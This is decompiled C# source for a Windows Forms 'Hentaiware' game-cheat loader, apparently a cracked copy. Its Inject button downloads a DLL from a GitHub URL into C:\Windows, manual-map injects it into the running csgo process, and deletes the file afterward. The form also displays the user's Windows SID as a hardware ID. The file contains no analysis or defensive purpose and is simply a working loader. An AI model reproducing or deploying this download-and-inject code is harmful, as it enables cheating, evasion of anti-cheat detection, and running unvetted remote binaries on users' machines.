using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Security.Principal;
using System.Windows.Forms;
using ManualMapInjection.Injection;

namespace WindowsFormsApp2;

public class Form1 : Form
{
	private string HWID;

	private IContainer components;

	private Button button1;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button2;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		HWID = WindowsIdentity.GetCurrent().User!.Value;
		((Control)textBox1).set_Text(HWID);
		((TextBoxBase)textBox1).set_ReadOnly(true);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_003a: Unknown result type (might be due to invalid IL or missing references)
		WebClient webClient = new WebClient();
		string text = "C:\\Windows\\haveafun.dll";
		webClient.DownloadFile("https://github.com/SwaglTTl/Gucci/raw/master/hentai.dll", text);
		Process p = Process.GetProcessesByName("csgo").FirstOrDefault();
		byte[] buffer = File.ReadAllBytes(text);
		if (!File.Exists(text))
		{
			MessageBox.Show("Erro: Dll não encontrada");
			return;
		}
		ManualMapInjector manualMapInjector = new ManualMapInjector(p)
		{
			AsyncInjection = true
		};
		((Control)label2).set_Text($"hmodule = 0x{manualMapInjector.Inject(buffer).ToInt64():x8}");
		if (File.Exists(text))
		{
			File.Delete(text);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_01bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_01c7: Expected O, but got Unknown
		//IL_0234: Unknown result type (might be due to invalid IL or missing references)
		//IL_023e: Expected O, but got Unknown
		//IL_02d7: Unknown result type (might be due to invalid IL or missing references)
		//IL_02e1: Expected O, but got Unknown
		//IL_0362: Unknown result type (might be due to invalid IL or missing references)
		//IL_036c: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		button1 = new Button();
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button2 = new Button();
		((Control)this).SuspendLayout();
		((Control)button1).set_BackColor(Color.Transparent);
		((Control)button1).set_Location(new Point(103, 71));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(238, 30));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Inject");
		((ButtonBase)button1).set_UseVisualStyleBackColor(false);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Location(new Point(12, 20));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(43, 13));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("[Status]");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(494, 72));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(35, 13));
		((Control)label2).set_TabIndex(2);
		((Control)label2).set_Text("label2");
		((Control)textBox1).set_Font(new Font("Courier New", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)textBox1).set_Location(new Point(150, 116));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(151, 20));
		((Control)textBox1).set_TabIndex(3);
		((Control)button2).set_BackColor(Color.Transparent);
		((Control)button2).set_Font(new Font("Courier New", 8.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(182, 154));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(81, 23));
		((Control)button2).set_TabIndex(4);
		((Control)button2).set_Text("Copy");
		((ButtonBase)button2).set_UseVisualStyleBackColor(false);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.Control);
		((Control)this).set_BackgroundImage((Image)componentResourceManager.GetObject("$this.BackgroundImage"));
		((Form)this).set_ClientSize(new Size(413, 325));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).set_ForeColor(SystemColors.ControlText);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("Hentaiware Loader Paste (CrackedByLife&Tezz)");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
